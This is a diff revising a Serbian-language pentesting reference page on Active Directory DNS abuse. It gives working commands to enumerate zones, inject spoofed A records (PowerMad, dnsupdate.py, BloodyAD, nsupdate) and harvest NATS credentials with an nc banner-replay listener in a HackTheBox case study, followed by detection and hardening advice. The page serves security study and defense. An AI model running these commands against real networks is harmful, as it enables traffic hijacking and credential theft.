@@ -1,10 +1,10 @@
-# AD DNS zapisi
+# AD DNS Records
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Po podrazumevanoj postavci **bilo koji korisnik** u Active Directory-ju može **enumerisati sve DNS zapise** u DNS zonama domena ili šume, slično zone transferu (korisnici mogu nabrajati podobjekte DNS zone u AD okruženju).
+Podrazumevano, **svaki korisnik** u Active Directory-ju može da **izlista sve DNS zapise** u DNS zonama domena ili šume, slično prenosu zone (korisnici mogu da izlistaju podređene objekte DNS zone u AD okruženju).
 
-Alat [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) omogućava **enumeraciju** i **izvoz** **svih DNS zapisa** iz zone u svrhu recona internih mreža.
+Alat [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) omogućava **enumeraciju** i **izvoz** **svih DNS zapisa** u zoni u svrhu izviđanja internih mreža.<sup>[[4]](#references)</sup>
 ```bash
 git clone https://github.com/dirkjanm/adidnsdump
 cd adidnsdump
@@ -21,15 +21,15 @@ adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.loca
 
 cat records.csv
 ```
->  adidnsdump v1.4.0 (April 2025) dodaje JSON/Greppable (`--json`) izlaz, multi-threaded DNS resolution i podršku za TLS 1.2/1.3 pri povezivanju na LDAPS
+>  adidnsdump v1.4.0 (April 2025) dodaje JSON/Greppable (`--json`) izlaz, višestruko-nitnu DNS rezoluciju i podršku za TLS 1.2/1.3 pri povezivanju na LDAPS
 
-For more information read [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
+Za više informacija pročitajte [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>
 
 ---
 
-## Kreiranje / Izmena zapisa (ADIDNS spoofing)
+## Kreiranje / izmena zapisa (ADIDNS spoofing)
 
-Pošto grupa **Authenticated Users** prema zadatim podešavanjima ima **Create Child** na DACL zone, svaki domain account (ili computer account) može registrovati dodatne zapise. Ovo se može iskoristiti za traffic hijacking, NTLM relay coercion ili čak full domain compromise.
+Pošto grupa **Authenticated Users** podrazumevano ima **Create Child** dozvolu na DACL-u zone, bilo koji domain account (ili computer account) može da registruje dodatne zapise. Ovo se može koristiti za otmicu saobraćaja, NTLM relay coercion ili čak potpunu kompromitaciju domena.
 
 ### PowerMad / Invoke-DNSUpdate (PowerShell)
 ```powershell
@@ -46,7 +46,7 @@ Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
 # add/replace an A record via secure dynamic-update
 python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
 ```
-*(dnsupdate.py dolazi uz Impacket ≥0.12.0)*
+*(dnsupdate.py isporučuje se uz Impacket ≥0.12.0)*
 
 ### BloodyAD
 ```bash
@@ -54,53 +54,57 @@ bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.
 ```
 ---
 
-## Uobičajene tehnike napada
+## Uobičajene osnove napada
 
-1. **Wildcard record** – `*.<zone>` pretvara AD DNS server u enterprise-wide responder sličan LLMNR/NBNS spoofingu. Može se zloupotrebiti za hvatanje NTLM hashes ili za njihovo relay-ovanje ka LDAP/SMB. (Zahteva da WINS-lookup bude onemogućen.)
-2. **WPAD hijack** – dodajte `wpad` (ili an **NS** record koji pokazuje na napadački host da biste zaobišli Global-Query-Block-List) i transparentno preusmeravajte outbound HTTP zahteve kako biste prikupili kredencijale. Microsoft je zakrpio wildcard/DNAME bypass-e (CVE-2018-8320) ali **NS-records i dalje rade**.
-3. **Stale entry takeover** – prisvojite IP adresu koja je ranije pripadala radnoj stanici i povezani DNS zapis će i dalje rešavati, omogućavajući resource-based constrained delegation ili Shadow-Credentials napade bez diranja DNS-a.
-4. **DHCP → DNS spoofing** – na podrazumevanoj Windows DHCP+DNS implementaciji neautentifikovani napadač na istoj subnet mreži može prepisati bilo koji postojeći A record (uključujući Domain Controllers) slanjem falsifikovanih DHCP zahteva koji pokreću dynamic DNS updates (Akamai “DDSpoof”, 2023). Ovo omogućava machine-in-the-middle poziciju nad Kerberos/LDAP i može dovesti do full domain takeover.
-5. **Certifried (CVE-2022-26923)** – promenite `dNSHostName` naloga mašine koju kontrolišete, registrujte odgovarajući A record, pa zatim zatražite sertifikat za to ime kako biste imitirali DC. Alati poput **Certipy** ili **BloodyAD** u potpunosti automatizuju tok.
+1. **Wildcard record** – `*.<zone>` pretvara AD DNS server u responder za čitavo preduzeće, sličan LLMNR/NBNS spoofing-u. Može se zloupotrebiti za hvatanje NTLM hash-eva ili njihovo relay prosleđivanje ka LDAP/SMB-u.  (Zahteva da WINS-lookup bude onemogućen.)<sup>[[1]](#references)</sup>
+2. **WPAD hijack** – dodajte `wpad` (ili **NS** record koji pokazuje na host napadača kako biste zaobišli Global-Query-Block-List) i transparentno prosleđujte odlazne HTTP zahteve kroz proxy radi prikupljanja kredencijala. Microsoft je zakrpao wildcard/ DNAME bypass-e (CVE-2018-8320), ali **NS-records i dalje rade**.<sup>[[1]](#references)</sup>
+3. **Stale entry takeover** – preuzmite IP adresu koja je prethodno pripadala workstations računaru, pa će povezani DNS entry i dalje biti razrešavan, što omogućava resource-based constrained delegation ili Shadow-Credentials napade bez ikakvog menjanja DNS-a.
+4. **DHCP → DNS spoofing** – u podrazumevanoj Windows DHCP+DNS deployment konfiguraciji, neautentifikovani napadač na istom subnetu može da prepiše bilo koji postojeći A record (uključujući Domain Controllers) slanjem falsifikovanih DHCP zahteva koji pokreću dinamičke DNS update-e (Akamai „DDSpoof“, 2023).  Ovo omogućava machine-in-the-middle napad nad Kerberos/LDAP-om i može dovesti do potpunog preuzimanja domena.<sup>[[2]](#references)</sup>
+5. **Certifried (CVE-2022-26923)** – promenite `dNSHostName` machine account-a koji kontrolišete, registrujte odgovarajući A record, a zatim zatražite certificate za to ime kako biste se impersonirali kao DC. Alati kao što su **Certipy** ili **BloodyAD** u potpunosti automatizuju ovaj tok.
 
 ---
 
-### Interno preuzimanje servisa putem zastarelih dinamičkih zapisa (NATS studija slučaja)
+### Hijacking internih servisa putem zastarelih dinamičkih record-a (NATS case study)
 
-Kada su dinamičke izmene otvorene za sve autentifikovane korisnike, **ime servisa koje je odregistrovano može biti ponovo preuzeto i usmereno na napadačku infrastrukturu**. Mirage HTB DC je eksponirao hostname `nats-svc.mirage.htb` nakon DNS scavenginga, tako da je bilo koji korisnik sa niskim privilegijama mogao:
+Kada su dynamic update-i otvoreni za sve autentifikovane korisnike, **deregistrovano ime servisa može ponovo da se preuzme i usmeri na infrastrukturu napadača**. Mirage HTB DC je nakon DNS scavenging-a izložio hostname `nats-svc.mirage.htb`, pa je svaki korisnik sa niskim privilegijama mogao da:<sup>[[3]](#references)</sup>
 
-1. **Potvrdite da zapis nedostaje** i saznajte SOA pomoću `dig`:
+1. **Potvrdi da record nedostaje** i sazna SOA pomoću `dig`:
 ```bash
 dig @dc01.mirage.htb nats-svc.mirage.htb
 ```
-2. **Ponovo kreirajte zapis** prema eksternom/VPN interfejsu koji kontrolišu:
+2. **Ponovo kreirajte zapis** ka eksternom/VPN interfejsu koji kontrolišu:
 ```bash
 nsupdate
 > server 10.10.11.78
 > update add nats-svc.mirage.htb 300 A 10.10.14.2
 > send
 ```
-3. **Impersonate the plaintext service**. NATS klijenti očekuju da vide jedan `INFO { ... }` banner pre nego što pošalju credentials, tako da kopiranje legitimnog bannera sa pravog brokera je dovoljno za prikupljanje tajni:
+3. **Oponašajte servis u plaintext-u**. NATS klijenti očekuju da vide jedan `INFO { ... }` baner pre nego što pošalju kredencijale, pa je kopiranje legitimnog banera sa pravog brokera dovoljno za prikupljanje tajni:
 ```bash
 # Capture a single INFO line from the real service and replay it to victims
 nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
 ```
-Bilo koji klijent koji razreši oteto ime će odmah leak-ovati svoj JSON `CONNECT` frame (uključujući `"user"`/`"pass"`) listeneru. Pokretanje zvaničnog `nats-server -V` binarnog fajla na hostu napadača, isključivanje redact-ovanja logova ili samo prisluškivanje sesije sa Wireshark daje iste plaintext credentials zato što je TLS bio opcion.
+Svaki klijent koji razreši oteto ime odmah će leak-ovati svoj JSON `CONNECT` frame (uključujući `"user"`/`"pass"`) listener-u. Pokretanje zvaničnog `nats-server -V` binary-ja na attacker hostu, isključivanje redaction-a logova ili jednostavno sniffing sesije pomoću Wireshark-a daje iste plaintext credentials, jer je TLS bio opcionalan.
 
-4. **Pivot with the captured creds** – u Mirage ukradeni NATS nalog je obezbedio JetStream pristup, što je otkrilo istorijske događaje autentifikacije koji sadrže ponovo iskoristive AD korisničke/lozinke.
+4. **Pivot sa prikupljenim credentials** – u Mirage-u je ukradeni NATS account omogućio JetStream access, koji je otkrio istorijske authentication events koji su sadržali ponovo upotrebljiva AD usernames/passwords.
+
+Ovaj pattern se primenjuje na svaki AD-integrisani service koji se oslanja na nezaštićene TCP handshakes (HTTP APIs, RPC, MQTT itd.): kada se DNS record otme, attacker postaje service.
 
 ---
 
-## Detekcija i ojačavanje
+## Detekcija i hardening
 
-* Deny **Authenticated Users** the *Create all child objects* right na osetljivim zonama i delegirajte dinamička ažuriranja dedikovanom nalogu koji koristi DHCP.
-* Ako su potrebna dynamic updates, postavite zonu na **Secure-only** i omogućite **Name Protection** u DHCP tako da samo owner computer object može prepisati svoj zapis.
-* Monitor DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) i LDAP zapise upisane u `CN=MicrosoftDNS,DC=DomainDnsZones`.
-* Block opasna imena (`wpad`, `isatap`, `*`) pomoću namerno-benignog zapisa ili putem Global Query Block List.
-* Održavajte DNS servere ažurnim – npr. RCE bagovi CVE-2024-26224 i CVE-2024-26231 dostigli su **CVSS 9.8** i mogu se iskoristiti remote protiv Domain Controllers.
+* Uskratite **Authenticated Users** pravo *Create all child objects* na osetljivim zonama i delegirajte dynamic updates dedicated account-u koji koristi DHCP.
+* Ako su dynamic updates neophodni, podesite zonu na **Secure-only** i omogućite **Name Protection** u DHCP-u, tako da samo owner computer object može da overwrite-uje sopstveni record.
+* Nadgledajte DNS Server event IDs 257/252 (dynamic update), 770 (zone transfer) i LDAP writes ka `CN=MicrosoftDNS,DC=DomainDnsZones`.
+* Blokirajte opasna imena (`wpad`, `isatap`, `*`) pomoću namerno benignog record-a ili preko **Global Query Block List**.
+* Održavajte DNS servers patched – npr. RCE bugs CVE-2024-26224 i CVE-2024-26231 dostigli su **CVSS 9.8** i mogu se remote exploit-ovati protiv Domain Controllers.
 
-## References
+## Reference
 
-- Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More” (2018, i dalje de-facto referenca za wildcard/WPAD napade)
-- Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dec 2023)
-- [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
+- [1] [ADIDNS Revisited - WPAD, GQBL, i još mnogo toga](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, i dalje de-facto reference za wildcard/WPAD attacks)
+- [2] [Spoofing DNS Records zloupotrebom DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (decembar 2023)
+- [3] [HackTheBox Mirage: Lančano iskorišćavanje NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets i Kerberoasting-a](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
+- [4] [Getting in the Zone: Dumping Active Directory DNS-a pomoću adidnsdump-a](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
+
 {{#include ../../banners/hacktricks-training.md}}
